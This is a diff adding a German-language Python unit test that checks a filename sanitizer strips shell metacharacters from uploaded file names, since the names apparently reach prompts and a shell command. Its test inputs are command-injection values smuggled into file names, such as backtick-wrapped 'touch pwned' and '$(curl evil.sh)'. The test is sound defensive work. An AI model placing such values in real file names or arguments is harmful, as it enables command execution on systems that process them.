@@ -35,6 +35,18 @@ def test_dateiname_entfernt_pfadanteile_und_prozentkodierung():
     assert projekte._dateiname("a%2F..%2Fb.md") == "b.md"
 
 
+def test_dateiname_entfernt_shell_metazeichen():
+    # Der Name landet ungeprüft in Prosa-Prompts (praesentation.py,
+    # prompts.py) und im verbliebenen Shell-Kommando — Backticks, "$(",
+    # Anführungszeichen &Co. dürfen nicht durchkommen.
+    assert projekte._dateiname("`touch pwned`.pdf") == "touch pwned.pdf"
+    # "(" ")" bleiben erlaubt (z. B. "Foto (1).pdf") — "$" fällt weg, damit
+    # "$(...)" keine Kommando-Substitution mehr bildet.
+    assert projekte._dateiname("$(curl evil.sh).pdf") == "(curl evil.sh).pdf"
+    assert projekte._dateiname('quote"injection.pdf') == "quoteinjection.pdf"
+    assert projekte._dateiname("a;b|c.pdf") == "abc.pdf"
+
+
 def test_create_legt_ordner_und_dateien_an(projekte_tmp):
     slug = projekte.create(BRIEF, design_md=b"# CI", material=[("q.md", b"Quelle")])
     d = projekte_tmp / slug
